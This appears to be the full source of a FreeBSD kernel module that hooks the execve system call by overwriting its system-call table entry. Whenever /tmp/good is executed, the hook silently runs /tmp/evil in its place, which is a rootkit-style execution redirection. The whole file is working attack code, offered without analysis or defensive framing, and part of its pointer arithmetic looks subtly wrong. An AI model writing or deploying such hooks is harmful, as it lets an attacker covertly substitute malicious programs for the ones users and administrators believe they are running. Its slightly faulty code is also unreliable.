#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/types.h>
#include <sys/systm.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#define GOOD "/tmp/good"
#define EVIL "/tmp/evil"

static int execve_hook(struct thread *td, void *args)
{
	struct execve_args *uap;
	struct execve_args kernel_ea;
	struct execve_args *user_ea;
	struct vmspace *vm;
	vm_offset_t base, addr;

	int error;
	char e_fname[] = EVIL;

	uap = (struct execve_args *)args;

	if (strcmp(uap->fname, GOOD) == 0) {
		vm = curthread->td_proc->p_vmspace;
		base = round_page((vm_offset_t) vm->vm_daddr);
		addr = base + ctob(vm->vm_dsize);

		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
			VMFS_NO_SPACE, VM_PROT_ALL, VM_PROT_ALL, 0);
		vm->vm_dsize += btoc(PAGE_SIZE);

		copyout(&e_fname, (char *)addr, strlen(e_fname));
		kernel_ea.fname = (char *)addr;
		kernel_ea.argv = uap->argv;
		kernel_ea.envv = uap->envv;

		user_ea = (struct execve_args *)addr + sizeof(e_fname);
		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

		error = sys_execve(curthread, user_ea);
	} else {
		error = sys_execve(td, args);
	}

	return error;
}

static int load(struct module *module, int cmd, void *arg)
{
	switch (cmd) {
	case MOD_LOAD:
		sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
		uprintf("Execve is at %p\n",
			(void *)sysent[SYS_execve].sy_call);
		break;
	case MOD_UNLOAD:
		sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
		uprintf("Execve is at %p\n",
			(void *)sysent[SYS_execve].sy_call);
		break;
	}
	return 0;
}

static moduledata_t module_data = {
	"execve_hook",
	load
};

DECLARE_MODULE(execve_hook, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
